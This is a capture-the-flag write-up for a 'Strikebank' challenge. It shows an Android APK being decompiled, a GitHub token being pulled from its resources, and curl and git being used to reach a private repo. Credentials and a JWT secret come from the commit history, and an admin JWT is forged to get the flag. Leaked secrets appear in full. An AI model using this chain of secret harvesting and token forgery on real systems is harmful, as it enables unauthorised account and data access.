# Strikebank at risk

First of all decompile the `ticket.apk`  using jadx-tool by command 

```bash
jadx -d "$(pwd)/jadx_out" "$(pwd)/ticket.apk"
```

Reconned through the decompiled folders and found some folders at `com/strikebank` , which are most likely auto generated folders. 

Checked the strings.xml file at `resources/res/values/strings.xml`

Found:

1. google_api_key =`AIzaSyD3fG5-xyz12345ABCDE67FGHIJKLmnopQR`
    
    ![image.png](images/image.png)
    
2. auth_key =`dXNlcjpnaXRodWJfcGF0XzExQjJQVDNKWTBueFNtSnlRZjdPSFZfWENvM243ZTJXcUd2bzB0NnV5SnNUVzJNSlRoRjBJdDNRTklrSHRPUjhnQUxOSDVQUjVYbDBKOTJ2WDM=`
    
    ![image.png](images/image%201.png)
    

Decoding base64 encoded auth key we get

user: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

![image.png](images/image%202.png)

using the command: 

```bash
curl -H "Authorization: Bearer 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" https://api.github.com/user
```

i get the following result

![image.png](images/image%203.png)

```json
{
  "login": "suryanandanmajumder",
  "id": 245317031,
  "node_id": "U_kgDODp89pw",
  "avatar_url": "https://avatars.githubusercontent.com/u/245317031?v=4",
  "gravatar_id": "",
  "url": "https://api.github.com/users/suryanandanmajumder",
  "html_url": "https://github.com/suryanandanmajumder",
  "followers_url": "https://api.github.com/users/suryanandanmajumder/followers",
  "following_url": "https://api.github.com/users/suryanandanmajumder/following{/other_user}",
  "gists_url": "https://api.github.com/users/suryanandanmajumder/gists{/gist_id}",
  "starred_url": "https://api.github.com/users/suryanandanmajumder/starred{/owner}{/repo}",
  "subscriptions_url": "https://api.github.com/users/suryanandanmajumder/subscriptions",
  "organizations_url": "https://api.github.com/users/suryanandanmajumder/orgs",
  "repos_url": "https://api.github.com/users/suryanandanmajumder/repos",
  "events_url": "https://api.github.com/users/suryanandanmajumder/events{/privacy}",
  "received_events_url": "https://api.github.com/users/suryanandanmajumder/received_events",
  "type": "User",
  "user_view_type": "public",
  "site_admin": false,
  "name": null,
  "company": null,
  "blog": "",
  "location": null,
  "email": null,
  "hireable": null,
  "bio": null,
  "twitter_username": null,
  "notification_email": null,
  "public_repos": 0,
  "public_gists": 0,
  "followers": 2,
  "following": 0,
  "created_at": "2025-11-21T05:36:17Z",
  "updated_at": "2025-11-21T05:36:17Z"
}

```

No public repos, using the same token searching for any private repos

```bash
curl -H "Authorization: Bearer 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" https://api.github.com/user/repos
```

![image.png](images/image%204.png)

result:

```json
[
  {
    "id": 1160666889,
    "node_id": "R_kgDORS5fCQ",
    "name": "ticket",
    "full_name": "suryanandanmajumder/ticket",
    "private": true,
    "owner": {
      "login": "suryanandanmajumder",
      "id": 245317031,
      "node_id": "U_kgDODp89pw",
      "avatar_url": "https://avatars.githubusercontent.com/u/245317031?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/suryanandanmajumder",
      "html_url": "https://github.com/suryanandanmajumder",
      "followers_url": "https://api.github.com/users/suryanandanmajumder/followers",
      "following_url": "https://api.github.com/users/suryanandanmajumder/following{/other_user}",
      "gists_url": "https://api.github.com/users/suryanandanmajumder/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/suryanandanmajumder/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/suryanandanmajumder/subscriptions",
      "organizations_url": "https://api.github.com/users/suryanandanmajumder/orgs",
      "repos_url": "https://api.github.com/users/suryanandanmajumder/repos",
      "events_url": "https://api.github.com/users/suryanandanmajumder/events{/privacy}",
      "received_events_url": "https://api.github.com/users/suryanandanmajumder/received_events",
      "type": "User",
      "user_view_type": "public",
      "site_admin": false
    },
    "html_url": "https://github.com/suryanandanmajumder/ticket",
    "description": "Backend for STRIKE Bank",
    "fork": false,
    "url": "https://api.github.com/repos/suryanandanmajumder/ticket",
    "forks_url": "https://api.github.com/repos/suryanandanmajumder/ticket/forks",
    "keys_url": "https://api.github.com/repos/suryanandanmajumder/ticket/keys{/key_id}",
    "collaborators_url": "https://api.github.com/repos/suryanandanmajumder/ticket/collaborators{/collaborator}",
    "teams_url": "https://api.github.com/repos/suryanandanmajumder/ticket/teams",
    "hooks_url": "https://api.github.com/repos/suryanandanmajumder/ticket/hooks",
    "issue_events_url": "https://api.github.com/repos/suryanandanmajumder/ticket/issues/events{/number}",
    "events_url": "https://api.github.com/repos/suryanandanmajumder/ticket/events",
    "assignees_url": "https://api.github.com/repos/suryanandanmajumder/ticket/assignees{/user}",
    "branches_url": "https://api.github.com/repos/suryanandanmajumder/ticket/branches{/branch}",
    "tags_url": "https://api.github.com/repos/suryanandanmajumder/ticket/tags",
    "blobs_url": "https://api.github.com/repos/suryanandanmajumder/ticket/git/blobs{/sha}",
    "git_tags_url": "https://api.github.com/repos/suryanandanmajumder/ticket/git/tags{/sha}",
    "git_refs_url": "https://api.github.com/repos/suryanandanmajumder/ticket/git/refs{/sha}",
    "trees_url": "https://api.github.com/repos/suryanandanmajumder/ticket/git/trees{/sha}",
    "statuses_url": "https://api.github.com/repos/suryanandanmajumder/ticket/statuses/{sha}",
    "languages_url": "https://api.github.com/repos/suryanandanmajumder/ticket/languages",
    "stargazers_url": "https://api.github.com/repos/suryanandanmajumder/ticket/stargazers",
    "contributors_url": "https://api.github.com/repos/suryanandanmajumder/ticket/contributors",
    "subscribers_url": "https://api.github.com/repos/suryanandanmajumder/ticket/subscribers",
    "subscription_url": "https://api.github.com/repos/suryanandanmajumder/ticket/subscription",
    "commits_url": "https://api.github.com/repos/suryanandanmajumder/ticket/commits{/sha}",
    "git_commits_url": "https://api.github.com/repos/suryanandanmajumder/ticket/git/commits{/sha}",
    "comments_url": "https://api.github.com/repos/suryanandanmajumder/ticket/comments{/number}",
    "issue_comment_url": "https://api.github.com/repos/suryanandanmajumder/ticket/issues/comments{/number}",
    "contents_url": "https://api.github.com/repos/suryanandanmajumder/ticket/contents/{+path}",
    "compare_url": "https://api.github.com/repos/suryanandanmajumder/ticket/compare/{base}...{head}",
    "merges_url": "https://api.github.com/repos/suryanandanmajumder/ticket/merges",
    "archive_url": "https://api.github.com/repos/suryanandanmajumder/ticket/{archive_format}{/ref}",
    "downloads_url": "https://api.github.com/repos/suryanandanmajumder/ticket/downloads",
    "issues_url": "https://api.github.com/repos/suryanandanmajumder/ticket/issues{/number}",
    "pulls_url": "https://api.github.com/repos/suryanandanmajumder/ticket/pulls{/number}",
    "milestones_url": "https://api.github.com/repos/suryanandanmajumder/ticket/milestones{/number}",
    "notifications_url": "https://api.github.com/repos/suryanandanmajumder/ticket/notifications{?since,all,participating}",
    "labels_url": "https://api.github.com/repos/suryanandanmajumder/ticket/labels{/name}",
    "releases_url": "https://api.github.com/repos/suryanandanmajumder/ticket/releases{/id}",
    "deployments_url": "https://api.github.com/repos/suryanandanmajumder/ticket/deployments",
    "created_at": "2026-02-18T08:18:05Z",
    "updated_at": "2026-02-18T09:39:15Z",
    "pushed_at": "2026-02-18T09:39:11Z",
    "git_url": "git://github.com/suryanandanmajumder/ticket.git",
    "ssh_url": "git@github.com:suryanandanmajumder/ticket.git",
    "clone_url": "https://github.com/suryanandanmajumder/ticket.git",
    "svn_url": "https://github.com/suryanandanmajumder/ticket",
    "homepage": null,
    "size": 17,
    "stargazers_count": 0,
    "watchers_count": 0,
    "language": "PHP",
    "has_issues": true,
    "has_projects": true,
    "has_downloads": true,
    "has_wiki": false,
    "has_pages": false,
    "has_discussions": false,
    "forks_count": 0,
    "mirror_url": null,
    "archived": false,
    "disabled": false,
    "open_issues_count": 0,
    "license": null,
    "allow_forking": true,
    "is_template": false,
    "web_commit_signoff_required": false,
    "has_pull_requests": true,
    "pull_request_creation_policy": "all",
    "topics": [

    ],
    "visibility": "private",
    "forks": 0,
    "open_issues": 0,
    "watchers": 0,
    "default_branch": "main",
    "permissions": {
      "admin": true,
      "maintain": true,
      "push": true,
      "triage": true,
      "pull": true
    }
  }
]
   
```

So, we get a private repo that says “Backend for strikebank”. 

CLoned the git repo locally using command

![image.png](images/image%205.png)

```json
git clone https://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@github.com/suryanandanmajumder/ticket.git
```

Checking the git commits of the repo using command: 

```json
git log -p
```

we find the hard coded credentials 

username: `tuhin1729`
pass: `1029384756`

![image.png](images/image%206.png)

Also we find the jwt_secret

JWT_Secret = `Str!k3B4nkSup3rs3cr37`

![image.png](images/image%207.png)

i logged in into the website as `tuhin1729` and it gave a jwt.

 

![image.png](images/image%208.png)

Modified the token inside [jwt.io](http://jwt.io) with username = `admin` and exploited **the exp value to extend validity**. 

![image.png](images/image%209.png)

I used that jwt on the website and i got the flag. 
Flag → `CloudSEK{pl4y!ng_w!7h_jw7_i$_fun}`

![image.png](images/image%2010.png)